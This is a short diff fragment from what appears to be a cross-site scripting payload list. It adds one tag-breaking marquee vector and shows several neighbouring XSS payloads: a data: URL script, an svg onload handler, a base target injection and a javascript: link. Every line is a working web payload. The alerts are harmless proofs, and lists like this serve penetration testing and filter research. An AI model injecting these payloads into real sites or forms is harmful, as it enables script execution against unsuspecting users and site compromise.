@@ -1168,4 +1168,5 @@ data:text/html,<script>alert(document.domain)</script>
 <svg onload=0?1:alert(9)>
 <base target="<script>alert(1)</script>">
 <a href="javascript:name">CLICK</a>
+</title<marquee/onstart=confirm(1)>xxxx
 /* RFI STOP */
